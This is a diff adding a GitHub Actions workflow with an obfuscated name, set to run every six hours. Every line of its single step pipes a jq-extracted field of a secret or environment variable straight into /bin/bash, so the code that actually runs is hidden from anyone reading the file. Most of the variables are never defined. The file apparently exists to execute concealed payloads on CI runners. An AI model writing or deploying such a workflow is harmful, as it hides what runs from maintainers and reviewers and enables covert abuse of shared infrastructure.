@@ -1,0 +1,26 @@
+name: qingwenshicaoxiansheng
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '50 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: qingwenshicaoxiansheng
+        env:
+          p83: ${{ secrets.p83 }}
+        run: |
+          echo $p83 | jq -r .dn8 | /bin/bash
+          echo $oh23 | jq -r .cilgc6 | /bin/bash
+          echo $w98 | jq -r .emb51044 | /bin/bash
+          echo $lrzkg304 | jq -r .aqup0667 | /bin/bash
+          echo $jah367 | jq -r .f188 | /bin/bash
+          echo $wsmg627 | jq -r .fw39893 | /bin/bash
+          echo $ziq860 | jq -r .sfb38454 | /bin/bash
+          echo $ewvg139 | jq -r .myil519 | /bin/bash
+          echo $gyrwk2 | jq -r .xnppq2844 | /bin/bash
+
